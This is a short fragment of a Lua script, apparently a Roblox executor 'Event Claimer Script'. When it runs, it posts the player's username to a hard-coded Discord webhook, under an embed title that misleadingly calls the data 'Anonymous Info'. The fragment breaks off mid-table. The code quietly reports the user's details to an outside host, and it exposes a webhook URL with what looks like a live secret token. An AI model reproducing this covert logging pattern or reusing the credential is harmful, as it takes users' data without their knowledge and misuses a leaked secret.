if req then
	req({
		Url = "https://discord.com/api/webhooks/1401191906792439851/WhX-CKdoN1OmyfVMrbrSDaMxY05vT29OtkWNOcLx_b5UnX9yLb0W4WUeeYrWRENvkJUb",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game:GetService("HttpService"):JSONEncode({
			username = "Executor Bot",
			embeds = {
				{
					title = "Script executed : Event Claimer Script : Anonymous Info",
					color = 0,
					fields = {
						{
							name = "Username",
							value = player.Name,
